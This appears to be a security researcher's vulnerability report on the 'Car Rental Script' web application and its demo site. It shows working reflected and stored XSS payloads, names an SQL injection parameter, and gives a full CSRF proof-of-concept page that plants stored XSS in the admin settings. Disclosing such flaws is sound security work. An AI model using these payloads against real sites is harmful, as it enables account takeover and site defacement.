### Car Rental Script- the lastest version - SQL Injection/XSS/CSRF

Well,  when I pentest the official demo site of Car Rental Script, I found some vulnerabilities here.


#### XSS:

##### Reflect-XSS

```
http://travelbookingscript.com/demo/taxibooking_new/admin/areaedit.php?carid=1%27%22%3E123%3Cimg%20src=x%20onerror=console.log(/XSS/)%3E123%3C%22
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Car-Rental-Script/xss1.png)


##### Stored-XSS 


```
http://travelbookingscript.com/demo/taxibooking_new/admin/sitesettings.php
```

POST parameters:

```
------WebKitFormBoundary908AMAzKLBTagFpr
Content-Disposition: form-data; name="websitename"

Javana rent cars'"><svg/onload=alert(/XSS/)><'"

```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Car-Rental-Script/xss2.png)


#### SQL Injection:

##### sqli
```
http://travelbookingscript.com/demo/taxibooking_new/admin/carlistedit.php?carid=36
```

![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Car-Rental-Script/sqli.png)


You can see,  we can obtain the current data user or more sensitive data now!


#### CSRF

We can use csrf attack to cheat the user to change sensitive settings in the user panel, even add stored-xss content into it.

poc:

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http:\/\/travelbookingscript.com\/demo\/taxibooking_new\/admin\/sitesettings.php?succ", true);
        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=----WebKitFormBoundary908AMAzKLBTagFpr");
        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,image\/apng,*\/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.9");
        xhr.withCredentials = true;
        var body = "------WebKitFormBoundary908AMAzKLBTagFpr\r\n" + 
          "Content-Disposition: form-data; name=\"websitename\"\r\n" + 
          "\r\n" + 
          "Javana rent cars\'\"\x3e\x3csvg/onload=alert(/XSS/)\x3e\x3c\'\"\r\n" + 
          "------WebKitFormBoundary908AMAzKLBTagFpr\r\n" + 
          "Content-Disposition: form-data; name=\"title\"\r\n" + 
          "\r\n" + 
          "Javana rent cars script\r\n" + 
          "------WebKitFormBoundary908AMAzKLBTagFpr\r\n" + 
          "Content-Disposition: form-data; name=\"admin_mailid\"\r\n" + 
          "\r\n" + 
          "javanarentcars.com\r\n" + 
          "------WebKitFormBoundary908AMAzKLBTagFpr\r\n" + 
          "Content-Disposition: form-data; name=\"keyword\"\r\n" + 
          "\r\n" + 
          "Javanarentcars\r\n" + 
          "------WebKitFormBoundary908AMAzKLBTagFpr\r\n" + 
          "Content-Disposition: form-data; name=\"description\"\r\n" + 
          "\r\n" + 
          "Car Rental \r\n" + 
          "------WebKitFormBoundary908AMAzKLBTagFpr\r\n" + 
          "Content-Disposition: form-data; name=\"websiteurl\"\r\n" + 
          "\r\n" + 
          "http://www.javanarentcars.co.id\r\n" + 
          "------WebKitFormBoundary908AMAzKLBTagFpr\r\n" + 
          "Content-Disposition: form-data; name=\"adminmobi\"\r\n" + 
          "\r\n" + 
          "98413006621\r\n" + 
          "------WebKitFormBoundary908AMAzKLBTagFpr\r\n" + 
          "Content-Disposition: form-data; name=\"fbook\"\r\n" + 
          "\r\n" + 
          "https://www.facebook.com/javanarentcars\r\n" + 
          "------WebKitFormBoundary908AMAzKLBTagFpr\r\n" + 
          "Content-Disposition: form-data; name=\"twtr\"\r\n" + 
          "\r\n" + 
          "https://twitter.com/javanarentcars\r\n" + 
          "------WebKitFormBoundary908AMAzKLBTagFpr\r\n" + 
          "Content-Disposition: form-data; name=\"google\"\r\n" + 
          "\r\n" + 
          "https://accounts.google.com/#\r\n" + 
          "------WebKitFormBoundary908AMAzKLBTagFpr\r\n" + 
          "Content-Disposition: form-data; name=\"smtpserver\"\r\n" + 
          "\r\n" + 
          "mail.i-netsolution.com\r\n" + 
          "------WebKitFormBoundary908AMAzKLBTagFpr\r\n" + 
          "Content-Disposition: form-data; name=\"smtpuser\"\r\n" + 
          "\r\n" + 
          "user\r\n" + 
          "------WebKitFormBoundary908AMAzKLBTagFpr\r\n" + 
          "Content-Disposition: form-data; name=\"smtppass\"\r\n" + 
          "\r\n" + 
          "23001\r\n" + 
          "------WebKitFormBoundary908AMAzKLBTagFpr\r\n" + 
          "Content-Disposition: form-data; name=\"logo\"; filename=\"\"\r\n" + 
          "Content-Type: application/octet-stream\r\n" + 
          "\r\n" + 
          "\r\n" + 
          "------WebKitFormBoundary908AMAzKLBTagFpr\r\n" + 
          "Content-Disposition: form-data; name=\"oldlogo\"\r\n" + 
          "\r\n" + 
          "1510728426rent cars.jpg\r\n" + 
          "------WebKitFormBoundary908AMAzKLBTagFpr\r\n" + 
          "Content-Disposition: form-data; name=\"submit\"\r\n" + 
          "\r\n" + 
          "Submit\r\n" + 
          "------WebKitFormBoundary908AMAzKLBTagFpr--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>

```

This vulnerability does not need evil attacker to login into the admin or the user panel.

